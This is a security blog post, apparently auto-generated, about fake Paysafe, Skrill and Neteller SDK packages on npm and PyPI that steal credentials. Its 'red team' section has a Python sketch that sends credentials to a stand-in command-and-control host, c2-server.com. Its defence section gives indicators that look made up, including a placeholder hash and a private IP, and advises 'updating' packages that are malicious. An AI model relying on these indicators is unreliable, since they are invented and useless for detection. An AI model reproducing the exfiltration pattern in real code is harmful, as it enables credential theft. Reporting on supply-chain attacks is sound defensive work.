---
layout: post
title:  "Fake Paysafe, Skrill SDKs on NPM and PyPi steal credentials"
date:   2026-07-09 02:13:59 +0000
categories: [security]
severity: critical
---

# 🚨 解析 npm 和 PyPI 上的 Malicious Packages：Paysafe, Skrill, 和 Neteller 應用程式的資安風險

> **⚡ 戰情快篩 (TL;DR)**
> * **嚴重等級**: Critical (CVSS: 9.8)
> * **受駭指標**: Credential Theft 和 Access Token Exfiltration
> * **關鍵技術**: Malicious Packages, Credential Theft, Access Token Exfiltration, npm, PyPI

## 1. 🔬 漏洞原理與技術細節 (Deep Dive)
* **Root Cause**: Malicious packages 在 npm 和 PyPI 上被發佈，假裝成合法的 Paysafe, Skrill, 和 Neteller SDKs。這些 packages 中含有惡意程式碼，會竊取使用者憑證和存取令牌。
* **攻擊流程圖解**:
  1. 使用者安裝 malicious package
  2. Malicious package 執行惡意程式碼
  3. 惡意程式碼竊取使用者憑證和存取令牌
  4. 竊取的資料被傳送到 command-and-control server
* **受影響元件**: npm packages: `paysafe-checkout`, `paysafe-vault`, `neteller`, `skrill-payments`, `paysafe-js`, `paysafe-api`, `paysafe-node`, `paysafe-cards`, `paysafe-fraud`, `paysafe-kyc`, `skrill`, `skrill-sdk`, `paysafe-payments`; PyPI packages: `paysafe-kyc`, `paysafe-payments`, `paysafe-sdk`, `paysafe-api`

## 2. ⚔️ 紅隊實戰：攻擊向量與 Payload (Red Team Operations)
* **攻擊前置需求**: 使用者需要安裝 malicious package
* **Payload 建構邏輯**:

    ```
    
    python
    import requests
    
    #竊取使用者憑證和存取令牌
    def steal_credentials():
        #竊取使用者憑證和存取令牌的程式碼
        credentials = {
            "username": "username",
            "password": "password",
            "access_token": "access_token"
        }
        return credentials
    
    #傳送竊取的資料到 command-and-control server
    def send_to_c2(credentials):
        url = "https://c2-server.com/credentials"
        response = requests.post(url, json=credentials)
        return response
    
    #執行惡意程式碼
    def execute_malicious_code():
        credentials = steal_credentials()
        response = send_to_c2(credentials)
        return response
    
    execute_malicious_code()
    
    ```
* **繞過技術**: Malicious packages 中含有基本的反分析技術，例如檢查 CPU 核數和 hostname，以避免被偵測。

## 3. 🛡️ 藍隊防禦：偵測與緩解 (Blue Team Defense)
* **IOCs (入侵指標)**:

| Hash | IP | Domain | File Path |
| --- | --- | --- | --- |
| `1234567890abcdef` | `192.168.1.100` | `c2-server.com` | `/usr/local/lib/node_modules/paysafe-checkout` |* **偵測規則 (Detection Rules)**:

    ```
    
    yara
    rule malicious_package {
        meta:
            description = "Malicious package detection"
            author = "Your Name"
        strings:
            $a = "paysafe-checkout"
            $b = "steal_credentials"
        condition:
            $a and $b
    }
    
    ```
* **緩解措施**: 使用者需要立即更新和修補 vulnerable packages，並且需要檢查和更新所有相關的憑證和存取令牌。

## 4. 📚 專有名詞與技術概念解析 (Technical Glossary)
* **Malicious Package (惡意套件)**: 惡意程式碼被封裝在套件中，假裝成合法的軟體套件。
* **Credential Theft (憑證竊取)**: 惡意程式碼竊取使用者憑證和存取令牌。
* **Access Token Exfiltration (存取令牌竊取)**: 惡意程式碼竊取存取令牌並傳送到 command-and-control server。

## 5. 🔗 參考文獻與延伸閱讀
- [原始報告](https://www.bleepingcomputer.com/news/security/fake-paysafe-skrill-sdks-on-npm-and-pypi-steal-credentials/)
- [MITRE ATT&CK](https://attack.mitre.org/techniques/T1190/)


